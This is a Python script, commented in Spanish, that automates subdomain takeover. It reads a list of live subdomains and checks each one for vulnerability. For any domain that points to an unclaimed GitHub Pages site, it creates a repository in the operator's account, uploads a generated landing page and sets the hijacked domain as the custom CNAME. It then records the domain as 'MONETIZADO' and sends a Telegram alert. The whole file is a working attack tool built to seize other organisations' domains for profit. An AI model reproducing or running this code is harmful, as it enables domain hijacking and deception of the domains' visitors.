import sqlite3
import os
import base64
import requests
from fingerprint import check_vulnerability

# La DB se guardará en la raíz/database/
DB_PATH = os.path.join(os.getcwd(), "database", "inventory.db")
GH_USERNAME = "TU_USUARIO_DE_GITHUB" # <--- IMPRESCINDIBLE CAMBIAR ESTO

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()
    curr.execute('CREATE TABLE IF NOT EXISTS findings (domain TEXT PRIMARY KEY, service TEXT, status TEXT)')
    conn.commit()
    conn.close()

def auto_takeover_github(vulnerable_domain):
    gh_token = os.getenv("GH_PAT")
    repo_name = f"ghost-{vulnerable_domain.replace('.', '-')}"
    headers = {"Authorization": f"token {gh_token}", "Accept": "application/vnd.github.v3+json"}
    
    # Crear repositorio en tu cuenta
    r = requests.post("https://api.github.com/user/repos", headers=headers, json={"name": repo_name, "auto_init": True})
    
    if r.status_code == 201:
        try:
            # Subir la landing generada por monetization/landing_gen.py
            with open("dist/index.html", "rb") as f:
                content = base64.b64encode(f.read()).decode()
            
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/contents/index.html", 
                         headers=headers, json={"message": "Ghost Deploy", "content": content})
            
            # Activar GitHub Pages con el dominio capturado
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/pages", 
                         headers=headers, json={"cname": vulnerable_domain})
            return True
        except Exception as e:
            print(f"Error subiendo archivos: {e}")
            return False
    return False

def run_surgical_scan():
    init_db()
    # live_subs.txt se genera en la raíz por el workflow
    live_file = os.path.join(os.getcwd(), "live_subs.txt")
    if not os.path.exists(live_file): return

    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()

    with open(live_file, "r") as f:
        for line in f:
            domain = line.strip()
            if not domain: continue

            curr.execute("SELECT domain FROM findings WHERE domain=?", (domain,))
            if curr.fetchone(): continue

            print(f"[*] Analizando: {domain}")
            result = check_vulnerability(domain)

            if result["vulnerable"]:
                if result["service"] == "GitHub Pages":
                    if auto_takeover_github(domain):
                        msg = f"💰 *MONETIZADO:* `{domain}`\n🚀 *Servicio:* GitHub Pages"
                        requests.get(f"https://api.telegram.org/bot{os.getenv('TG_TOKEN')}/sendMessage?chat_id={os.getenv('TG_ID')}&text={msg}&parse_mode=Markdown")
                        
                        curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "GitHub Pages", "MONETIZADO"))
                        conn.commit()
                        conn.close()
                        return # ÉXITO: Terminamos este ciclo de 6 horas
                else:
                    curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, result["service"], "VULN_MANUAL"))
            else:
                # Marcamos como seguro para no re-escanearlo
                curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "N/A", "SAFE"))
            
            conn.commit()
    conn.close()

if __name__ == "__main__":
    run_surgical_scan()
